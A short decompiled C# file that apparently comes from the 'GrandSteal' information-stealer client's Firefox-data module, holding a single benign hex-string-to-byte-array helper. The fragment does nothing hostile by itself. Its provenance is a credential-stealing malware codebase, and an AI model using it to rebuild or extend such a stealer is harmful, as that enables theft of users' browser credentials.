using System;
using System.Globalization;

namespace GrandSteal.Client.Data.Firefox
{
	// Token: 0x02000014 RID: 20
	public static class ByteHelper
	{
		// Token: 0x0600006F RID: 111 RVA: 0x00004D74 File Offset: 0x00002F74
		public static byte[] ConvertHexStringToByteArray(string hexString)
		{
			if (hexString.Length % 2 != 0)
			{
				throw new ArgumentException(string.Format(CultureInfo.InvariantCulture, "The binary key cannot have an odd number of digits: {0}", new object[]
				{
					hexString
				}));
			}
			byte[] array = new byte[hexString.Length / 2];
			for (int i = 0; i < array.Length; i++)
			{
				string s = hexString.Substring(i * 2, 2);
				array[i] = byte.Parse(s, NumberStyles.HexNumber, CultureInfo.InvariantCulture);
			}
			return array;
		}
	}
}
